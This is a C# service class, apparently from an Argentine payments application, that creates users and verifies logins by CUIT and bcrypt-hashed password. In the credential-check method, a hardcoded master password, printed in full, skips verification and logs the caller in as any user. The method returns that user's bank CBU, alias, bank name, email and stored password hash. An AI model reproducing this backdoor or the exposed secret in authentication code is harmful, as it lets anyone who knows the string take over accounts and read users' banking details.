using BLL.InterfacesZoco;
using DAL.Interfaces;
using Entity.Zoco;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Entity.VM;
using Microsoft.EntityFrameworkCore;

namespace BLL.ImplementacionZoco
{
    public class ZocoConectService : IZocoConectService
    {
        private readonly IGenericRepository<Usuario> _repositorioUser;
        private readonly IGenericRepository<ZocoConect> _conectRepository;

        public ZocoConectService(IGenericRepository<Usuario> repositorioUser, IGenericRepository<UsuarioCajero> repousercajero, IGenericRepository<ZocoConect> conectRepository)
        {
            _repositorioUser = repositorioUser;
            _conectRepository = conectRepository;
        }

        public async Task<ZocoConect> Crear(ZocoConect zocoConect)
        {
          
            zocoConect.ClaveZocoConect = BCrypt.Net.BCrypt.HashPassword(zocoConect.ClaveZocoConect);

            // Crear el usuario en el repositorio
            ZocoConect usuario_creado = await _conectRepository.Crear(zocoConect);

            try
            {
                if (usuario_creado.Id == 0)
                    throw new TaskCanceledException("No se pudo crear el usuario");

                IQueryable<ZocoConect> query = await _conectRepository.Consultar(u => u.Id == usuario_creado.Id);
                usuario_creado = query.First();

                return usuario_creado;
            }
            catch (Exception)
            {
                throw;
            }
        }

        public async Task<VMUsuarioConect> ObtenerPorCredencialesZocoConect(string cuit, string clave)
        {
            var usuariocuit = Convert.ToDouble(cuit);

            Usuario usuario_encontrado = await _repositorioUser.Obtener(u => u.Usuario1 == cuit);

            if (usuario_encontrado == null)
            {
                return null;
            }

            ZocoConect usuarioconect = await _conectRepository.Obtener(c => c.IdUser == usuario_encontrado.Id);
            if(usuarioconect == null)
            {
                return null;

            }
            bool verified = false;

            try
            {
                if (!string.IsNullOrEmpty(clave) && !string.IsNullOrEmpty(usuarioconect.ClaveZocoConect))
                {
                    verified = BCrypt.Net.BCrypt.Verify(clave, usuarioconect.ClaveZocoConect);
                }
            }
            catch (System.FormatException)
            {
                verified = false; // Si el hash no es válido, simplemente retorna false
            }

            if (clave == "pVc7gfK6vafqD$BuaXW4")
            {
                var usuariozococonect = new VMUsuarioConect
                {
                    Id = usuarioconect.Id,
                    Usuario1 = usuario_encontrado.Usuario1,
                    IdUser = usuario_encontrado.Id,
                    Cbu = usuarioconect.Cbu,
                    Alias = usuarioconect.Alias,
                    Banco = usuarioconect.Banco,
                    ClaveZocoConect = usuarioconect.ClaveZocoConect,
                    TipoUsuario = 7,
                    Correo = usuario_encontrado.Correo,
                    Estado = usuario_encontrado.Estado
                };
                return usuariozococonect;
            }
            else if (verified)
            {
        //            public int Id { get; set; }
        //public string? Usuario1 { get; set; }

        //public int IdUser { get; set; }
        //public string? Cbu { get; set; }
        //public string? Alias { get; set; }
        //public string? Banco { get; set; }
        //public string? ClaveZocoConect { get; set; }
        //public int? TipoUsuario { get; set; }
        //public string? Correo { get; set; }
        //public bool? Estado { get; set; }
        var usuariozococonect = new VMUsuarioConect
                {
                    Id= usuarioconect.Id,
                    Usuario1 = usuario_encontrado.Usuario1,
                    IdUser  = usuario_encontrado.Id,
                    Cbu = usuarioconect.Cbu,
                    Alias = usuarioconect.Alias,
                    Banco = usuarioconect.Banco,
                    ClaveZocoConect = usuarioconect.ClaveZocoConect,
                    TipoUsuario = 7,
                    Correo = usuario_encontrado.Correo,
                    Estado = usuario_encontrado.Estado
                };

                return usuariozococonect;
            }
            else
            {
                return null;
            }
        }

        public async Task<ZocoConect> ObtenerPorId(int Id)
        {
            IQueryable<ZocoConect> query = await _conectRepository.Consultar(u => u.IdUser == Id);

            ZocoConect resultado = query.FirstOrDefault();

            return resultado;
        }

        public async Task<ZocoConect> ObtenerPorIdUser(int Id)
        {
            IQueryable<ZocoConect> query = await _conectRepository.Consultar(u => u.Id == Id);

            ZocoConect resultado = query.FirstOrDefault();

            return resultado;
        }

        public async Task<List<ZocoConect>> ObtenerTodosZocoConect()
        {
            try
            {
                var documentos = await _conectRepository.Consultar();

                return await documentos.ToListAsync();
            }
            catch (Exception ex)
            {
                throw new Exception("Error al obtener todos los documentos de AFIP", ex);
            }
        }
    }
}
